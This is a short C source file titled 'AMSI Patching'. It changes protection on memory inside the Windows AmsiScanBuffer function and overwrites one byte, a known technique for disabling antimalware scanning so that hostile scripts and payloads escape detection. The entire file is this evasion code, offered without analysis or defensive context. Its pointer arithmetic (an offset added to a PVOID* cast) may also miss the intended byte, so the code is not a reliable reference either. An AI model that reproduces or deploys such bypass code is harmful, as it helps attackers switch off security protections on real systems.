/*
Title: AMSI Patching
*/
#include <Windows.h>
#include <amsi.h>
#pragma comment(lib, "amsi.lib")

BOOL AmsiPatching() {
	DWORD dwOffset = 0x83;
	DWORD dwOldProtect = 0;

	if (!VirtualProtect(
		(PVOID*)AmsiScanBuffer + dwOffset,
		1,
		PAGE_EXECUTE_READWRITE,
		&dwOldProtect
	)) {
		return FALSE;
	}

	memcpy((PVOID*)AmsiScanBuffer + dwOffset, "\x72", 1);

	if (!VirtualProtect(
		(PVOID*)AmsiScanBuffer + dwOffset,
		1,
		dwOldProtect,
		&dwOldProtect
	)) {
		return FALSE;
	}

	return TRUE;
}
